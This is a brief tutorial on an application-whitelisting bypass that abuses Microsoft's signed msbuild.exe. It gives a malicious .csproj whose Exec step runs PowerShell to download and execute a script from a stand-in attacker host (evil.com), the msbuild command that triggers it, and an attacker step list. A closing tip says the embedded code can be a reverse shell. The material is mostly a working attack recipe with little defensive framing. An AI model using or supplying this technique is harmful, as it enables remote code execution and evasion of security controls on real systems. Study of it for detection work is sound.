LOLBAS Technique

Leveraging `msbuild.exe` with Malicious Project Files

Executing Inline C# or VB Code

<!-- Malicious .csproj file -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <Exec Command="powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'" />
  </Target>
</Project>
# Then execute:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe /nologo /verbosity:q /target:Hello C:\Users\Public\malicious.csproj
Key Takeaway

`msbuild.exe` is a signed Microsoft binary, making it a powerful AWL bypass. It executes embedded code within trusted project files, allowing for arbitrary code execution.

`msbuild` Bypass Flow

1.

Attacker crafts malicious `.csproj` with embedded C# / VB code.

2.

Places `.csproj` on target system (e.g., `C:\Users\Public`).

3.

Executes `msbuild.exe` pointing to the malicious `.csproj` file.

4.

`msbuild.exe` processes the file and executes the embedded code.

Pro Tip

The embedded code can be anything from a simple command to a complex reverse shell, making this a highly versatile technique.
